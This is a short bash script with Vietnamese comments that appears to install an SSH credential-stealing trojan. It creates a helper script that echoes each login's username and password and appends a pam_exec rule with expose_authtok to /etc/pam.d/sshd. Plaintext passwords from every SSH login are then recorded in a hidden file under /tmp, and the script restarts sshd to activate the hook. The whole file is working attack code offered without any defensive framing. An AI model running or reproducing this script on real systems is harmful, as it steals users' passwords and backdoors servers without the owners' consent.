#!/bin/bash

file_log="/tmp/.log_sshtrojan1.txt"
file_sshd="/etc/pam.d/sshd"
file_exec="/root/sshlogger.sh"
if [[ -f $file_log ]]; then		#kiem tra tep co ton tai khong
    echo "File $file_log exits"
else					#neu khong thi tao file do
    echo "Create File $file_log"
    touch $file_log
fi

cat > $file_exec << EOF 		#them noi dung duoi day vao file (ghi de)
#!/bin/bash
read password				#nhap mat khau
printf "Username: \$PAM_USER\nPassword: \$password\n"	#PAM_USER: ten nguoi dung
EOF

chmod +x $file_exec

echo "Run File"
cat >> $file_sshd << EOF
auth optional pam_exec.so expose_authtok log=$file_log $file_exec	#dung modul auth ket noi voi expose_authtok de chay $file_exec doc password tu input ket qua se dc luu vao $file_log 
EOF
echo "Restart SSH"
/etc/init.d/ssh restart
